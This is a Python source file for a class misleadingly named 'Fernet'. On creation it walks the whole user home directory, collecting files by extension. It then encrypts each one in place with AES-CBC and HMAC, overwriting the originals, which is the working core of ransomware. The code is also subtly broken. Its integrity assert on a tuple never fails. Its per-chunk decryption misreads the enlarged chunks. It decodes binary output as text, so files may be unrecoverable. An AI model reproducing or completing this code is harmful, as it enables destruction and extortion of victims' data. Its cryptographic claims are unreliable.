import os
import mmap
import shutil
import base64
import binascii
from pathlib import Path
from typing import Union, Dict, List
from hmac import new as new_hmac, compare_digest

from lib.modules.yaml import safe_load
from lib.cryptography.aes import (
    SALT_SIZE, HMAC_SIZE, 
    get_key_iv, AesCipher
)

MAX_FILE_SIZE = 1024 * 1024 * 10 # 10MB


class Fernet:
    def __init__(
        self, 
        key: Union[bytes, str]
    ) -> None:
        try:
            key = base64.urlsafe_b64decode(key)
        except binascii.Error as exc:
            raise ValueError(
                "Fernet key must be 32 url-safe base64-encoded bytes."
            ) from exc
        if len(key) != 32:
            raise ValueError(
                "Fernet key must be 32 url-safe base64-encoded bytes."
            )
        self.key = key
        self.list_file()
        
    
    @classmethod
    def generate_key(cls) -> bytes:
        return base64.urlsafe_b64encode(os.urandom(32))
    
    def __encrypt(
        self, 
        plaintext: Union[bytes, str]
    ) -> str:
        if isinstance(self.key, str):
            self.key = self.key.encode('utf-8')
        if isinstance(plaintext, str):
            plaintext = plaintext.encode('utf-8')

        salt = os.urandom(SALT_SIZE)
        key, hmac_key, iv = get_key_iv(self.key, salt)
        ciphertext = AesCipher(key).encrypt_cbc(plaintext, iv)
        hmac = new_hmac(hmac_key, salt + ciphertext, 'sha256').digest()
        assert len(hmac) == HMAC_SIZE
        
        return hmac + salt + ciphertext
    
    def __decrypt(
        self, 
        ciphertext: Union[bytes, str]
    ) -> str:
        if isinstance(self.key, str):
            self.key = self.key.encode('utf-8')

        hmac, ciphertext = (
            ciphertext[:HMAC_SIZE], 
            ciphertext[HMAC_SIZE:]
        )
        salt, ciphertext = (
            ciphertext[:SALT_SIZE], 
            ciphertext[SALT_SIZE:]
        )
        key, hmac_key, iv = get_key_iv(self.key, salt)

        expected_hmac = new_hmac(
            hmac_key, salt + ciphertext, 'sha256'
        ).digest()
        assert (
            compare_digest(hmac, expected_hmac), 
            'Ciphertext corrupted or tampered.'
        )

        return AesCipher(key).decrypt_cbc(ciphertext, iv).decode()
    
    def list_file(self) -> Dict[str, List[str]]:
        """
        Lists files in the user's home directory categorized by file extension.

        Returns:
            Dict[str, List[str]]: A dictionary where keys are file extensions and values are lists of file paths.
        """
        with open('scripts/extensions.yaml', 'r') as file:
            exts = safe_load(file)

        self.file_categories: Dict[str, List[str]] = {category: [] for category in exts}
        extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}

        for entry in Path.home().rglob('*'):
            if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
                self.file_categories[extcategory[ext]].append(str(entry))

    def process_files(
        self, 
        mode: str
    ) -> None:
        """
        Encrypts or decrypts files based on the specified mode.

        Args:
            mode (str): Either 'encrypt' or 'decrypt'.
        """
        for _, files in self.file_categories.items():
            for file in files:
                temp_file = file + '.temp'
                try:
                    with open(file, 'rb') as original_file, open(temp_file, 'wb') as temp_file:
                        while True:
                            chunk = original_file.read(MAX_FILE_SIZE)  # Đọc từng phần của tệp
                            if not chunk:
                                break
                            processed_chunk = self.__encrypt(chunk) if mode == 'encrypt' else self.__decrypt(chunk)
                            temp_file.write(processed_chunk)
                    shutil.move(temp_file.name, file)
                except Exception:
                    if os.path.exists(temp_file.name):
                        os.remove(temp_file.name)
    
    def Encrypt(self) -> None:
        """
        Encrypts files using Fernet encryption.

        Args:
            Private (Fernet): An instance of the Fernet class.
        """
        self.process_files('encrypt')
    
    def Decrypt(self) -> None:
        """
        Decrypts files using Fernet decryption.

        Args:
            Private (Fernet): An instance of the Fernet class.
        """
        self.process_files('decrypt')
